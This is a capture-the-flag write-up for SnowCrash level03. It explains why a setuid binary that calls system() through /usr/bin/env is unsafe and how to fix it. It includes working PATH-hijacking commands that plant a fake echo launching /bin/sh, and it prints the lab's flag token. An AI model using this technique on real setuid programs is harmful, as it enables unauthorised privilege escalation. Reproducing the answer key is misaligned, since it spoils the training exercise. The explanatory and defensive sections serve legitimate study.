# Level03

## Flag

qi0maab88jeaj46qoumi7maus

## Discovery

The main task, as in all SnowCrash exercises, is to execute `getflag` under the required user. Then the command will return the token, which is used for authentication.

### Attempt to run getflag

```
level03@SnowCrash:~$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

### Checking the directory contents

The directory contains a binary file **level03**:

```
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The file belongs to user **flag03**, group **level03**, and has **setuid/setgid** bits.

Running it shows:

```
./level03
Exploit me
```

### Analysis using nm

Checked which functions are used in the binary:

```
nm level03
...
080484a4 T main
         U system@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U setresgid@@GLIBC_2.0
...
```

In the `main` section there is a call to **system()**, which is almost certainly a vulnerability.

### Dynamic analysis with ltrace

Ran the program:

```
level03@SnowCrash:~$ ltrace ./level03
getegid() = 2003
geteuid() = 2003
setresgid(2003, 2003, 2003) = 0
setresuid(2003, 2003, 2003) = 0
system("/usr/bin/env echo Exploit me"Exploit me
...
```

### What this means

The program explicitly resets its UID/GID:

* `setresgid(2003,2003,2003)` → OK
* `setresuid(2003,2003,2003)` → OK

Meaning it DELIBERATELY drops privileges to level03.

But the key part is the call:

```
system("/usr/bin/env echo Exploit me")
```

`/usr/bin/env` searches for `echo` in the PATH environment variable.

### Cause of the vulnerability

If you modify PATH so that the first directory contains a fake `echo`, the program will execute our script with the permissions of the file owner **flag03**.
The file level03 belongs to user flag03 and has the setuid bit (-rwsr-sr-x).

```
chmod u+s → enables setuid (run as file owner).
chmod g+s → enables setgid (run as group owner).
```

In combination with normal permissions, this produces exactly the string: `-rwsr-sr-x`.

This means: when you, as user level03, run this binary, the Linux kernel automatically sets the effective UID of the process to the file owner — flag03.
Thus, the process actually runs with the rights of flag03, even if you executed it as level03.

Inside the program there are calls to setresuid(2003,2003,2003) and setresgid(2003,2003,2003).
Meaning the program’s author resets privileges back to level03.
So ltrace correctly shows that the current EUID/GID = 2003.

But the process *still keeps* the saved UID=3003 (flag03) thanks to the setuid mechanism.
This allows system() or other functions to again use the file owner's privileges.

### Creating a fake echo

```
echo '#!/bin/bash' > /tmp/echo
echo '/bin/sh' >> /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```

### Obtaining the flag

```
level03@SnowCrash:~$ ./level03 
$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Use (Exploit)

The exploit is based on a classic vulnerability: substituting a system command via PATH in combination with a setuid binary.

Even though the program calls `setresuid(2003,...)` and drops privileges, it was still launched by the kernel with effective UID=**flag03**, because it has the setuid bit:

```
-rwsr-sr-x 1 flag03 level03 ...
```

The system() call spawns a new process, which inherits the saved UID of the calling process, and under certain conditions runs with the file owner's privileges.

Therefore, the fake `echo` runs as **flag03**.

## Prevention

### Level mistakes

* **Using system()** — unsafe because it depends on PATH and the shell.
* **setuid binary calls system()** — classic danger.
* **Incomplete privilege dropping** — even after setresuid, the program retains the saved UID.

### How to prevent

* Replace `system()` with `execve()` with an absolute path.
* Hardcode PATH, clear the environment before invoking external programs.
* Completely drop privileges: `setuid(getuid())` without keeping setuid.
* Avoid setuid entirely when possible.

## Documentation

* `man system`
* `man execve`
* `man setuid`
* `man capabilities`
* Reverse engineering basics — [https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d](https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d)

## Automatic Testing

A basic test that checks for system() calls in setuid binaries:

```bash
#!/bin/bash

FILE=./level03

if [[ -u $FILE ]]; then
  echo "Warning: setuid binary detected"
  if strings "$FILE" | grep -q "system("; then
    echo "Danger: setuid binary uses system()"
    exit 1
  fi
fi

echo "OK"
```